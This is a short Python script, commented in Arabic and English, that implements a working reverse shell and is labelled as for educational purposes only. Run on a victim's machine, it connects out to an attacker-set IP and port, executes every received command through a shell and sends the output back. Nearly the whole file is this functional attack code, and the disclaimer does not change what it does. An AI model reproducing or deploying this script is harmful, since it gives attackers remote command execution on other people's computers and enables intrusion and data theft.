# 🐍 سكريبت Reverse Shell بسيط بلغة بايثون، للتعلم فقط
# يتم تشغيله على جهاز الضحية للاتصال بجهاز المهاجم وتنفيذ أوامره

# 📌 فقط لأغراض تعليمية - يمنع استخدامه في أي نشاط غير قانوني

# Simple reverse shell in Python (For educational purposes only)
# This script connects back to the attacker's machine and executes received commands.

import subprocess  # 📂 مكتبة للتعامل مع الأوامر ومخرجاتها - أفضل من os.system
import socket      # 🌐 مكتبة بايثون لإنشاء الاتصال عبر الشبكة

# إعداد الاتصال
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = "0.0.0.0"     # عنوان جهاز المهاجم (عدّله إلى عنوانك الحقيقي عند التجريب)
port = 4445        # المنفذ المستخدم - تأكد أنه مفتوح على جدار الحماية لديك

try:
    s.connect((ip, port))  # الاتصال بجهاز المهاجم
    print("[+] Waiting for connection...")
    print(f"[+] Connection established from {ip}:{port}")
except Exception as err:
    print(f"[!] Connection failed: {err}")
    exit(1)

# الاستماع وتنفيذ الأوامر المرسلة من الطرف الآخر
while True:
    try:
        command = s.recv(4096).decode()  # استقبال الأمر من المهاجم
        if not command:
            break  # في حال انقطع الاتصال
        result = subprocess.check_output(
            command, shell=True, text=True, stderr=subprocess.STDOUT
        )
        s.send(result.encode())  # إرسال نتيجة التنفيذ
    except subprocess.CalledProcessError as e:
        # إرسال أي خطأ في التنفيذ للمهاجم
        s.send(str(e.output).encode())
    except Exception as e:
        # التعامل مع أي خطأ عام
        s.send(f"[!] Unexpected error: {str(e)}".encode())



    
    


